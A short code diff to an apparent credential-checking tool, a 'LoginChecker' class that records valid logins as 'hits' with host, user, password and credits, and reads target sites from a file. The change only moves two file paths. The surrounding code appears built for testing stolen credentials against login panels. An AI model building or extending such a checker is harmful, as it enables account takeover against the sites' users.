@@ -127,7 +127,7 @@ class LoginChecker:
             return None
 
     def save_valid_login(self, nhost, user, password, credits):
-        base_path = "/home/_Paineis/hits"
+        base_path = "/home/novidades/_Paineis/hits"
         os.makedirs(base_path, exist_ok=True)
         with open(f"{base_path}/Sr.Hell@{nhost}.txt", "a") as f:
             f.write(f"\n╼╾ Sr. Hell ╼╾\n")
@@ -250,7 +250,7 @@ _/
  """
     print(ascii_art)
     try:
-        with open("/home/_Paineis/site.txt", "r") as f:
+        with open("/home/novidades/_Paineis/site.txt", "r") as f:
             sites = [site.strip() for site in f.readlines() if site.strip()]
     except FileNotFoundError:
         print(f"{Fore.RED}Arquivo site.txt não encontrado!")
